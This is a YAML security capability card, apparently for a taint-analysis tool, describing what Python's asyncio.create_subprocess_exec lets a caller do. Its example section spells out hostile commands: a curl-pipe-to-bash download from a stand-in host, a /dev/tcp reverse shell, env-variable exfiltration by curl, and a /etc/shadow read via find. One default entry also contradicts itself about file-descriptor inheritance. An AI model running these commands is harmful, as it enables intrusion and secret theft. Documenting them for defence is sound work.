# asyncio.create_subprocess_exec

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-011d6aa2e6a60cd4
api: asyncio.create_subprocess_exec
api_family: asyncio.create_subprocess_exec
runtime:
  language: python
  ecosystem: python-runtime
  package: asyncio
  version: legacy-source-bound
capability_class: process-spawn
normative_authority: capability-facts-only
bound_sinks:
- asyncio.create_subprocess_exec(program, *args, **kwds)
roles:
- role_id: command
  description: Legacy controlled role command.
  bindings:
  - expression: args
    caller_bindable: true
- role_id: executable
  description: Legacy controlled role executable.
  bindings:
  - expression: executable
    caller_bindable: true
- role_id: path
  description: Legacy controlled role path.
  bindings:
  - expression: path
    caller_bindable: true
facets:
- facet_id: legacy-facet-8c99c5d1
  capability: Execute any binary accessible on the host filesystem (resolved via PATH or an absolute path). The spawned process inherits the calling process's uid/gid and runs with the same OS privileges.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-7c51d2dd
  capability: Execute arbitrary scripts or bytecode interpreters by pointing `program` at the interpreter binary and passing script/code arguments via `*args` (e.g. `python3 -c '…'`, `node -e '…'`, `perl -e '…'`, `ruby -e '…'`, `php -r '…'`, `lua -e '…'`).
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-1eb849ac
  capability: Commit full shell command injection by spawning a shell binary as `program` with `-c` as the first arg and an arbitrary command string as the second arg (e.g. `["/bin/sh", "-c", payload]` or `["/bin/bash", "-c", payload]`). This unlocks pipes, redirects, command chaining (`;`, `&&`, `||`), subshells, process substitution, here-docs, glob expansion, and all other shell grammar.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-97013c8f
  capability: 'Chain multi-stage payloads inside a single `-c` string: download artifacts, decode, write to disk, and execute.'
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-3045e72e
  capability: Establish reverse shells or bind shells via shell one-liners (bash TCP, netcat, socat, ncat, /dev/tcp if compiled in, python pty, etc.).
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-5a9f9f20
  capability: Pipe the spawned process's stdout/stderr into the caller's async event loop by passing `stdout=asyncio.subprocess.PIPE` / `stderr=asyncio.subprocess.PIPE`, enabling data exfiltration from the subprocess.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-2ce89216
  capability: Feed arbitrary data into the subprocess's stdin by passing `stdin=asyncio.subprocess.PIPE` and writing to `Process.stdin`, enabling interactive control or staged payload delivery.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-4081b156
  capability: Merge stderr into stdout via `stderr=asyncio.subprocess.STDOUT`, simplifying exfiltration to a single stream.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-3a142530
  capability: Discard output silently via `stdout=asyncio.subprocess.DEVNULL` / `stderr=asyncio.subprocess.DEVNULL`, hiding evidence of execution.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-336d4a82
  capability: Spawn long-running daemon processes that outlive the parent (unless garbage-collection kills them — see implicit_defaults).
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-58e29d2f
  capability: Write files by redirecting shell output (`cmd > /path/to/target`), read files by redirecting input or using `cat`, and delete/move files via shell commands spawned through `-c`.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-778785be
  capability: 'Access network services: curl, wget, HTTP requests, DNS lookups, raw socket connections.'
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-eaa345ae
  capability: Leverage GTFOBins binaries (find, xargs, awk, tar, git, etc.) as the `program` argument to achieve code execution, file read, file write, or SUID escalation through their documented "exec" modes.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-5ce4364c
  capability: Exfiltrate environment variables (secrets, tokens, API keys) inherited by the child process by echoing them back through stdout or sending them over the network.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-8894f9df
  capability: Spawn child processes recursively — the subprocess can itself spawn further processes, building an unbounded process tree.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-c64bacbc
  capability: Use relative-path binaries; the spawned process searches PATH in the inherited environment, which can be influenced by preceding env-var manipulation.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
- facet_id: legacy-facet-570f1160
  capability: Combine with `os.chdir` or `cwd` keyword argument (passed through `**kwds` to the underlying event-loop transport) to control the working directory of the spawned process.
  role_ids:
  - command
  - executable
  - path
  activation:
    any_of:
    - predicate: role-bound
      subject: command
      operator: equals
      value: true
    - predicate: role-bound
      subject: executable
      operator: equals
      value: true
    - predicate: role-bound
      subject: path
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-f60773c0
  role_id: null
  value: The spawned process inherits the full environment (`os.environ`) of the parent process — including PATH, HOME, USER, SHELL, and any secrets injected via env vars — unless `env` is explicitly passed through `**kwds`.
  security_effect: The spawned process inherits the full environment (`os.environ`) of the parent process — including PATH, HOME, USER, SHELL, and any secrets injected via env vars — unless `env` is explicitly passed through `**kwds`.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-83b67891
  role_id: null
  value: The spawned process inherits the parent's current working directory (`os.getcwd()`) unless `cwd` is passed through `**kwds`.
  security_effect: The spawned process inherits the parent's current working directory (`os.getcwd()`) unless `cwd` is passed through `**kwds`.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-589380d0
  role_id: null
  value: Open file descriptors are inherited by default (the underlying `subprocess.Popen` default is `close_fds=True` on POSIX since Python 3.2, but `pass_fds` can explicitly leak descriptors through `**kwds`).
  security_effect: Open file descriptors are inherited by default (the underlying `subprocess.Popen` default is `close_fds=True` on POSIX since Python 3.2, but `pass_fds` can explicitly leak descriptors through `**kwds`).
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-c3ee2610
  role_id: null
  value: If the returned `Process` object is garbage-collected while the child is still running, the child process is **silently killed** by the event loop's destructor — no signal handler, no cleanup, no log. This is an automatic, implicit kill path.
  security_effect: If the returned `Process` object is garbage-collected while the child is still running, the child process is **silently killed** by the event loop's destructor — no signal handler, no cleanup, no log. This is an automatic, implicit kill path.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-68e1cf84
  role_id: null
  value: The `limit` parameter defaults to 65536 (buffer size for StreamReader wrappers); large output beyond this limit without being consumed can stall the child process on pipe buffer backpressure.
  security_effect: The `limit` parameter defaults to 65536 (buffer size for StreamReader wrappers); large output beyond this limit without being consumed can stall the child process on pipe buffer backpressure.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-2825c743
  role_id: null
  value: '`asyncio.create_subprocess_exec` does NOT invoke a shell (unlike `create_subprocess_shell`). However, nothing prevents passing a shell binary as `program` with `-c` + command as `*args`, which effectively grants shell semantics without the `_shell` suffix — this is an explicit choice by the caller, not an API guard.'
  security_effect: '`asyncio.create_subprocess_exec` does NOT invoke a shell (unlike `create_subprocess_shell`). However, nothing prevents passing a shell binary as `program` with `-c` + command as `*args`, which effectively grants shell semantics without the `_shell` suffix — this is an explicit choice by the caller, not an API guard.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-f86a083d
  role_id: null
  value: On Windows with `ProactorEventLoop`, the API is available; on Windows with the default `SelectorEventLoop`, it is not — the silent fallback is a `NotImplementedError`, not a security boundary.
  security_effect: On Windows with `ProactorEventLoop`, the API is available; on Windows with the default `SelectorEventLoop`, it is not — the silent fallback is a `NotImplementedError`, not a security boundary.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: "import asyncio\n\nasync def main():\n    # List files in /tmp — typical automation use\n    proc = await asyncio.create_subprocess_exec(\n        \"ls\", \"-la\", \"/tmp\",\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.PIPE,\n    )\n    stdout, stderr = await proc.communicate()\n    print(stdout.decode())\n\nasyncio.run(main())\n"
  capability_edge: "import asyncio\n\nasync def main():\n    # program === /bin/sh; args[0] === -c; args[1] === full attacker payload\n    payload = \"curl -s http://malicious.example/payload.sh | bash\"\n    proc = await asyncio.create_subprocess_exec(\n        \"/bin/sh\", \"-c\", payload,\n        stdout=asyncio.subprocess.PIPE,\n        stderr=asyncio.subprocess.PIPE,\n    )\n    stdout, stderr = await proc.communicate()\n    print(f\"exit={proc.returncode} stdout={stdout.decode()!r}\")\n\nasyncio.run(main())\n\n# Further edges:\n# - interpreter code exec: (\"python3\", \"-c\", \"__import__('os').system('id')\")\n# - reverse shell: (\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n# - GTFOBins file-read: (\"find\", \".\", \"-exec\", \"cat\", \"/etc/shadow\", \";\")\n# - GTFOBins SUID exec: (\"awk\", \"BEGIN {system('/bin/sh')}\")\n# - background daemon: (\"nohup\", \"/bin/sh\", \"-c\", \"while true; do curl -d \\\"$(env)\\\" http://exfil.example/; sleep 60; done &\"\
    )\n# - env exfil: (\"/bin/sh\", \"-c\", \"curl -d \\\"$(env)\\\" http://exfil.example/collect\")\n"
provenance:
- 'Python 3.x standard library: asyncio subprocess module'
- https://docs.python.org/3/library/asyncio-subprocess.html#asyncio.create_subprocess_exec
- https://docs.python.org/3/library/asyncio-subprocess.html#creating-subprocesses
- GTFOBins (https://gtfobins.github.io/) — exhaustive enumeration of benign Unix binaries capable of arbitrary code execution, file read, file write, and privilege escalation
- 'CWE-78: Improper Neutralization of Special Elements used in an OS Command (''OS Command Injection'')'
- subprocess.Popen documentation (underlying implementation) — https://docs.python.org/3/library/subprocess.html#popen-constructor
```
